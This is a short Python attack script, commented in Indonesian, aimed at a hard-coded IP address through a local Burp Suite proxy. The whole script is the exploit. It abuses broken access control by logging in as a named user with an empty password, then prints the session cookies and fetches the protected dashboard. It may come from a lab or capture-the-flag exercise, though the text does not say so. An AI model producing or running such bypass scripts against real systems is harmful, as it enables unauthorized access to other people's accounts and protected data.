import requests
import json

# Konfigurasi proxy Burp Suite
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

# Data login dengan BAC
login_data = {
    'username': 'kluntingisreal',
    'password': '',  # Kosongkan password untuk memanfaatkan BAC
}

# Kirim permintaan login
login_url = 'http://167.172.75.216/login'
headers = {'Content-Type': 'application/json'}
response = requests.post(login_url, data=json.dumps(login_data), headers=headers, proxies=proxies)

# Periksa respons
if response.status_code == 200:
    print('Login berhasil dengan BAC')
    print('Cookies:', response.cookies.get_dict())
    # Lakukan aksi lain setelah berhasil login dengan BAC
    # Misalnya, akses ke dashboard atau halaman lain yang terproteksi
    dashboard_url = 'http://167.172.75.216/dashboard'
    response_dashboard = requests.get(dashboard_url, cookies=response.cookies, proxies=proxies)
    if response_dashboard.status_code == 200:
        print('Akses dashboard berhasil')
        print(response_dashboard.text)
    else:
        print('Gagal mengakses dashboard')
else:
    print('Login gagal')
    print(response.text)
